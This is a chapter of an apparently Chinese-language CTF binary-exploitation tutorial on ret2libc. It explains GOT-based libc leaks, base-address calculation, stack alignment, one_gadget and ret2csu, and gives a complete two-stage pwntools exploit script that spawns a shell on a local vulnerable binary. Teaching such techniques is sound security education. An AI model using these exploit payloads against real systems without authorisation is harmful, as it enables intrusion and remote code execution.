# 第 10 章 ret2libc：借别人的代码用

> 程序里没有后门函数，栈也不可执行——但有一样东西是所有动态链接程序都有的：libc。里面藏着 `system`、`/bin/sh` 和无数的 gadget。这一章，我们学会「借鸡生蛋」。

---

## 10.1 为什么需要 ret2libc

回顾一下前两章的局限：

- **ret2text** 需要程序自身有 `system("/bin/sh")` 之类的后门——大多数程序没有
- **ret2shellcode** 需要栈可执行（NX 关闭）——现代系统默认 NX 开启

但几乎所有程序都会加载 **libc**（C 标准库），里面有我们需要的一切：

- `system` 函数
- 字符串 `/bin/sh`
- `execve` 函数
- 大量的 gadget（ROP 片段）

问题是：**libc 的加载地址受 ASLR 影响，每次运行都不同**。所以我们需要分两步走：

1. **泄露**：想办法打印出 libc 中某个函数的真实地址
2. **计算**：用泄露的地址减去偏移，得到 libc 基址，进而算出 `system` 和 `/bin/sh` 的地址
3. **利用**：第二次送入 payload，调用 `system("/bin/sh")`

这就是 ret2libc 的核心思路。

---

## 10.2 libc 地址是怎么算出来的

libc 在加载时，整个库被映射到一个连续的虚拟地址空间。**基址（base address）** 是这段空间的起始地址。库里的每个函数相对于基址有一个固定的**偏移量（offset）**。

```text
真实地址 = libc 基址 + 函数偏移
```

例如：

```text
libc 基址:         0x7f1234500000
system 偏移:       0x50d70
真实 system 地址:  0x7f1234550d70
```

偏移量可以从libc 文件里查到：

```bash
# 查看函数在 libc 中的偏移
nm -D /lib/x86_64-linux-gnu/libc.so.6 | grep ' system'
# 或者
readelf -sW /lib/x86_64-linux-gnu/libc.so.6 | grep ' system'

# 找 /bin/sh 字符串的偏移
strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep '/bin/sh'
```

用 pwntools 更方便：

```python
libc = ELF('./libc.so.6')
system_offset = libc.sym['system']          # 比如 0x50d70
binsh_offset = next(libc.search(b'/bin/sh\x00'))   # 比如 0x1d8698
```

> ⚠️ **注意**：不同版本、不同发行版的 libc，偏移量完全不同！CTF 比赛如果提供了 libc 文件，一定要用题目给的；没给的话，可能需要通过泄露多个地址来「爆破」libc 版本（可以用 `libc-database` 在线查询）。这是很多新手卡住的地方。

---

## 10.3 泄露 libc 地址：GOT 表的妙用

怎么知道 libc 里某个函数的真实地址？答案藏在 **GOT 表**里（第 5 章讲过）。

程序第一次调用 `puts("hello")` 时，动态链接器会解析出 `puts` 的真实地址并写入 `puts@got`。所以 GOT 表里存的就是 libc 函数的真实地址！

如果我们能**打印出 GOT 表的内容**，就得到了 libc 的真实地址。

怎么打印？调用 `puts` 本身，并把 GOT 表的地址作为参数传给它：

```python
# 用 puts 打印 puts@got 的内容
payload = flat(
    b'A' * offset,           # 填充到返回地址
    elf.plt['puts'],         # 调用 puts@plt
    elf.sym['main'],         # puts 执行完后回到 main（方便第二次利用）
    elf.got['puts']          # puts 的参数：puts@got 的地址
)
```

执行流程：

1. 栈溢出覆盖返回地址为 `puts@plt`
2. 同时把 `puts@got` 的地址放在栈上，作为 puts 的参数
3. 程序返回时跳到 `puts@plt`，但注意——**x86-64 的参数在 rdi 里，不是栈上！**

所以我们需要一个 `pop rdi; ret` gadget 来传递参数：

```python
pop_rdi = 0x4012a3    # pop rdi; ret 的地址（用 ROPgadget 找）

payload = flat(
    b'A' * offset,
    pop_rdi,             # 把下一个值弹进 rdi
    elf.got['puts'],     # rdi = puts@got（作为参数）
    elf.plt['puts'],     # 调用 puts(puts@got)
    elf.sym['main']      # 返回 main，进行第二次利用
)
```

puts 会打印出 `puts@got` 里的 8 字节内容（puts 的真实地址），然后返回到 main，程序重新开始，我们可以再发一次 payload。

接收泄露的地址：

```python
p.sendline(payload)
p.recvuntil(b'...')      # 跳过程序自己的输出
leak = p.recv(6)         # 通常只取 6 字节（地址的高 2 字节是 0x00）
puts_addr = u64(leak.ljust(8, b'\x00'))
log.success(f'puts address: {hex(puts_addr)}')
```

> 💡 **为什么只取 6 字节？** x86-64 的用户空间地址通常是 6 字节（`0x00007fxxxxxxxxxx`），高 2 字节是 `\x00\x00`。puts 遇到 `\x00` 会停止输出，所以只能收到 6 字节。用 `ljust(8, b'\x00')` 补齐到 8 字节。

计算 libc 基址和其他函数地址：

```python
libc_base = puts_addr - libc.sym['puts']
system_addr = libc_base + libc.sym['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh\x00'))
```

---

## 10.4 两阶段利用的完整流程

把整个过程串起来：

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

elf = ELF('./vuln', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

offset = 72
pop_rdi = 0x4012a3    # pop rdi; ret

# ====== 第一阶段：泄露 libc ======
p = process(elf.path)

payload1 = flat(
    b'A' * offset,
    pop_rdi,
    elf.got['puts'],
    elf.plt['puts'],
    elf.sym['main']        # 回到 main 进行第二次利用
)

p.sendlineafter(b'Input:', payload1)
p.recvline()               # 跳过回显
leak = p.recvuntil(b'\x7f')[-6:]  # 读到 0x7f 开头的地址
puts_addr = u64(leak.ljust(8, b'\x00'))
log.success(f'puts@libc: {hex(puts_addr)}')

libc_base = puts_addr - libc.sym['puts']
log.success(f'libc base: {hex(libc_base)}')

# ====== 第二阶段：getshell ======
system_addr = libc_base + libc.sym['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh\x00'))

# 注意栈对齐问题：可能需要加一个 ret gadget
ret_gadget = 0x40101a    # 单独一个 ret，用于对齐栈

payload2 = flat(
    b'A' * offset,
    ret_gadget,            # 调整 rsp 使其 16 字节对齐（视情况而定）
    pop_rdi,
    binsh_addr,
    system_addr,
    elf.sym['exit']        # system 执行完后正常退出
)

p.sendlineafter(b'Input:', payload2)
p.interactive()            # getshell！
```

### 栈对齐详解

你可能会疑惑：`ret_gadget` 是干嘛的？

x86-64 的 ABI 要求：调用一个函数时，`rsp` 必须是 **16 字节对齐**的（即 rsp 的低 4 位为 0）。libc 里的 `system` 函数内部使用了 SSE 指令（如 `movaps`），这些指令要求操作数按 16 字节对齐，否则会触发段错误。

我们的 payload 执行到 `system` 时，rsp 的值取决于填充长度和 gadget 数量。如果不凑巧没对齐，程序会崩溃在 `movaps` 上——这也是新手经常遇到的「明明地址都对，怎么一调用 system 就崩」的原因。

解决方法：在 payload 里插入一个单独的 `ret` 指令（地址随便找一个 `ret` gadget），它会消耗 8 字节栈空间，从而改变对齐状态。

```bash
ROPgadget --binary ./vuln | grep ': ret$'
# 0x000000000000101a : ret
```

如果加了 `ret` 还是崩，去掉试试；有时候需要 2 个。具体情况具体分析。

---

## 10.5 one_gadget：一键 getshell

除了调用 `system("/bin/sh")`，libc 里还有一些「万能地址」——调用它们时会自动执行 `execve("/bin/sh", ...)`，不需要我们控制参数。这些叫 **one_gadget**。

安装和使用：

```bash
gem install one_gadget
one_gadget ./libc.so.6
```

输出类似：

```text
0x50d70 execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL || rsi == NULL

0x50d94 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0xe3b2e execve("/bin/sh", rbx, rdx)
constraints:
  rbx == NULL || rdx == NULL
```

每个 one_gadget 都有**约束条件**（寄存器或栈上特定位置必须为 NULL）。如果条件不满足，调用它会崩溃。

使用方式：

```python
one_gadget_addr = libc_base + 0x50d70
payload = flat(
    b'A' * offset,
    one_gadget_addr
)
```

如果崩了，换下一个 one_gadget 试试。one_gadget 省去了构造参数的麻烦，但受约束条件限制，不一定每次都能用。

> 💡 **提示**：one_gadget 依赖栈上的特定条件，在本地能用的地址，远程不一定能用（因为环境变量不同，栈布局不同）。这是很多新手「本地通远程不通」的元凶之一。

---

## 10.6 ret2csu：万能 gadget

有时候程序里找不到 `pop rdi; ret`，或者需要同时控制多个参数（比如调用 `read(0, buf, size)` 需要控制 rdi、rsi、rdx 三个寄存器）。这时可以用 `__libc_csu_init` 函数里的通用 gadget。

`__libc_csu_init` 是 GCC 生成的初始化函数，几乎每个程序都有。它里面有这样的片段：

```asm
pop rbx
pop rbp
pop r12
pop r13
pop r14
pop r15
ret
```

以及：

```asm
mov rdx, r15
mov rsi, r14
mov edi, r13d
call [r12+rbx*8]
```

通过这两段 gadget 的组合，我们可以同时控制 rdi、rsi、rdx 三个参数寄存器，然后调用任意函数。

找 ret2csu gadget：

```bash
ROPgadget --binary ./vuln --only 'pop|ret|mov|call' | grep -A5 -B5 'r12'
```

或者用 pwntools 的 `ROP` 对象自动构造：

```python
rop = ROP(elf)
rop.ret2csu(edi, rsi, rdx, call_addr)
```

ret2csu 在 64 位 ROP 中非常有用，尤其是需要构造多参数函数调用时（比如 ORW）。

---

## 10.7 常见坑

1. **libc 版本不对**：最常见的坑。泄露的偏移量对不上，算出的地址全是错的。务必使用题目提供的 libc，或者用 `libc-database` 确认版本。
2. **泄露地址读错**：`p.recv(6)` 可能读到不完整的地址。用 `recvuntil(b'\x7f')[-6:]` 或 `recvline().strip()` 后再处理。
3. **栈对齐**：调用 system 崩溃在 `movaps` 上 → 加/减 `ret` gadget。
4. **没回到 main**：第一阶段泄露后，要让程序回到一个可以再次触发溢出的地方（通常是 main），否则没法发送第二阶段 payload。
5. **one_gadget 约束不满足**：换一个试试，或者改用 system。
6. **程序用了 setvbuf**：有些程序设置了缓冲，puts 的输出可能不会立即刷新。需要用 `sendlineafter` 等同步手段。

---

## 10.8 小结

这一章我们掌握了 ret2libc——栈利用的「标准武器」：

- **libc 的函数地址 = 基址 + 偏移**，基址受 ASLR 影响，偏移固定
- **GOT 表**存着 libc 函数的真实地址，可以通过调用 `puts(puts@got)` 泄露
- **两阶段利用**：先泄露 libc 基址，再调用 `system("/bin/sh")`
- **栈对齐**是调用 libc 函数时的常见坑，用 `ret` gadget 调整
- **one_gadget** 提供一键 getshell，但受约束条件限制
- **ret2csu** 提供控制多个参数的能力

现在你已经能解决大部分入门级栈题了。但如果你遇到 Canary 开启的程序，栈溢出会被拦截。下一章我们学习如何与 Canary 周旋。

---

**下一章**：[ROP：搭建自己的指令大厦](./ch11-ROP进阶.md)
